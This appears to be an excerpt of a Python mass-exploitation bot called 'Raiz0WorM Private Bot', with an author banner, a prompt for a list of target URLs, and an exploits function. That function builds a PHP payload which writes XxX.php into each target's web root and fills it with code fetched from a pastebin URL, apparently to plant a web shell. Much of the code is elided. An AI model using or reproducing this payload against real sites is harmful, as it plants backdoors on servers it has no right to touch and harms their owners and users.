...
#####################
try:
    os.system('title Raiz0WorM Private Bot')
except:
    pass
...
def banners():
  ...
  ____       _      _____        _____  ____  __  __
 |  _ \ __ _(_)____/ _ \ \      / / _ \|  _ \|  \/  |
 | |_) / _` | |_  / | | \ \ /\ / / | | | |_) | |\/| |
 |  _ < (_| | |/ /| |_| |\ V  V /| |_| |  _ <| |  | |
 |_| \_\__,_|_/___|\___/  \_/\_/  \___/|_| \_\_|  |_|

    Coded By: Raiz0 WorM
    Contact: FB.com/youness.ih.1
    Results : OK		
...
def exploits(url):
    try:
        ...
        pl = generate_payload(
            "fwrite(fopen($_SERVER['DOCUMENT_ROOT'].'/XxX.php','w+'),file_get_contents('https://pastebin.com/raw/HsmsbjQS'));")
...
def Main():
    try:
        ooo = raw_input('{}{} [Raiz0WorM-Scanner] Include Your List : '.format(fg, sb))
